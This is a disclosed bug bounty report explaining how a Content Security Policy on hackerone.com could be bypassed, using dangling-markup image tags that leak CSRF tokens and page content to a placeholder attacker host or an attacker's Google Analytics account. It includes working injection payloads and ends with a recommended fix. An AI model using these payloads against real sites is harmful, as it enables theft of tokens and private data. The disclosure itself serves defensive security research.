# Google Analytics could be used as CSP bypass for data exfiltration on hackerone.com

## Report Details
- **Report ID**: 199779
- **URL**: https://hackerone.com/reports/199779
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-01-19T23:35:16.499Z
- **Disclosed**: 2017-03-26T08:17:54.922Z

## Reporter
- **Username**: aaron_costello
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Greetings, I believe I may have found a way to bypass CSP on hackerone.com

The issue lies here:

```
img-src 'self' data: www.google-analytics.com
```

As you can imagine, how can image tags be used maliciously here to this safe site? Well, as you know, on google-analytics.com we have the ability to host user content.

Before we get into that, lets look at how image tags are processed.
Consider the following injected content:
```
<img src='https://evilsite.com/steal_csrf_token?html=
```
A tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages in the following way,:
```
<img src='https://evilsite.com/steal_csrf_token?html=
<form action="https://coinbase.com/poc">

<input type="hidden" name="csrf_token" value="some_csrf_token_value">
</form>
```
The resulting image element will send a request to https://evilsite.com/steal_csrf_token?html=/log_csrf?html=...some_csrf_token_value....

As a result, an attacker can leverage this dangling markup attack to exfiltrate CSRF tokens to a site of their choosing.

The issue
----------

First take a look at Google Analytics. Imagine a content injection that looks something like:
```
< injection point >
<p>secret</p>
```
The Google Analytics’ ea parameter is used to log event actions and can contain arbitrary strings. An attacker could setup a Google Analytics account and then inject an image referencing their account:
```
<img src='https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=
<p>secret</p>
```
This results in the following request, logging “secret” to their account:
```
https://www.google-analytics.com/collect?v=1&tid=UA-77300477-1&cid=2111515817&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=%3Cp%3Esecret%3C/p%3E
```

The solution
-------------

Swap from using their image based system to an XHR based approach (https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms)





## Attachments
No attachments
